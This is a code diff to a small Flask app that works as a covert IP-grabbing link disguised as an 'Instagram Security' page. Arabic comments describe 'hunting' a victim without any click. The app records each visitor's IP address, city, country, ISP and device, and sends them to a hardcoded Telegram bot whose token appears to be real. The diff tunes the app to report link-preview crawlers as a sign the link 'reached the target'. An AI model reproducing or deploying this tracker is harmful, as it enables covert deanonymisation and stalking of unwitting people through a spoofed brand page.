@@ -3,7 +3,7 @@ import requests
 
 app = Flask(__name__)
 
-# إعداداتك الأصلية 100%
+# إعداداتك الأصلية 
 TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
 CHAT_ID = "8524242091" 
 
@@ -11,8 +11,7 @@ def send_to_telegram(message):
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
     payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
     try:
-        # نفس السطر الأصلي حقك بالضبط لضمان وصول الرسائل
-        requests.post(url, json=payload, timeout=5)
+        requests.post(url, json=payload, timeout=10)
     except:
         pass
 
@@ -22,30 +21,33 @@ def send_to_telegram(message):
 def track():
     ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
     user_agent = request.headers.get('User-Agent', 'Unknown')
-    
-    # --- الفلتر لتجاوز بوتات الحماية اللي تظهر في صورك ---
     ua_lower = user_agent.lower()
-    # إذا كان الزائر بوت حماية (مثل اللي ظهروا عندك: Amazon, Vercel, Facebook)
-    if any(bot in ua_lower for bot in ['amazon', 'vercel', 'facebook', 'digitalocean']):
-        return "404 Not Found", 404
 
+    # --- سر الصيد بدون ضغط ---
+    # 1. إذا كان الطلب من سيرفرات أمازون أو فيسبوك (بوتات المعاينة)
+    if any(bot in ua_lower for bot in ['amazon', 'facebookexternalhit', 'vercel']):
+        # نرسل تنبيه بسيط بأن الرابط "تم فحصه" لكي تعرف أن الرسالة وصلت
+        send_to_telegram(f"📡 <b>الرابط وصل للهدف!</b>\nتمت المعاينة من سيرفر الحماية.\nIP: {ip_address}")
+        return "OK", 200
+
+    # 2. إذا كان الطلب من تطبيق انستقرام أو متصفح (الضحية رأى الرابط)
     try:
         geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
-        city = geo_res.get('city', 'Unknown')
-        country = geo_res.get('country', 'Unknown')
+        location = f"{geo_res.get('city', 'Unknown')}, {geo_res.get('country', 'Unknown')}"
         isp = geo_res.get('isp', 'Unknown')
     except:
-        city = country = isp = "Error"
+        location = isp = "Error"
 
     report = (
-        f"🎯 <b>تنبيه صيد جديد!</b>\n"
+        f"🎯 <b>صيد صامت (بدون ضغط)!</b>\n"
         f"--------------------------\n"
         f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
-        f"📍 <b>الموقع:</b> {city}, {country}\n"
+        f"📍 <b>الموقع:</b> {location}\n"
         f"🏢 <b>المزود:</b> {isp}\n"
         f"📱 <b>الجهاز:</b> {user_agent}\n"
         f"--------------------------"
     )
+    
     send_to_telegram(report)
     
     return """
@@ -53,9 +55,7 @@ def track():
     <html>
     <head>
         <meta property="og:title" content="Instagram Security">
-        <meta property="og:description" content="Confirm your identity to continue.">
         <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
-        <meta property="og:type" content="website">
     </head>
     <body><h1>404 Not Found</h1></body>
     </html>
